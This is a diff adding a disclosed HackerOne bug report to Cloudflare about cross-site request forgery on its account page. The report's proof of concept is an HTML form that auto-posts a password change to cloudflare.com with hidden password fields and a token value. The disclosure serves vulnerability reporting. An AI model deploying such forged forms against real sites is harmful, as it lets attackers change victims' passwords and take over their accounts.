@@ -1,0 +1,32 @@
+ReportLink:https://hackerone.com/reports/8849
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/robincool03111
+ReportedTo:Cloudflare(cloudflare)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:07.09.2014 17:00:26
+
+Summary:
+
+It was observed that the web application ‘www.cloudflare.com’ is vulnerable to cross site request forgery attacks via FORM field reconstruction.
+
+Risk : 
+An attacker could force an already authenticated user to perform actions that he or she didn’t intend to do, such as account creation, Updating account information, retrieval of account information, or any other functions provided by the application. 
+Attacker could even gain administrative control of the application by tricking an administrative user to load the malicious content.
+. 
+
+
+<form action="https://www.cloudflare.com/my-account.html" method="post">
+
+<input type="hidden" name="user_pass_old" value="*********"/>
+
+<input type="hidden" name="user_pass_new" value="*********"/>
+
+<input type="hidden" name="user_pass_new2" value="********"/>
+
+<input type="hidden" name="atok" value="1398143127-85cac144fb01c8f70e1c" />
+
+<input type="submit" name="act" value="update_pass" />
+
+</form>
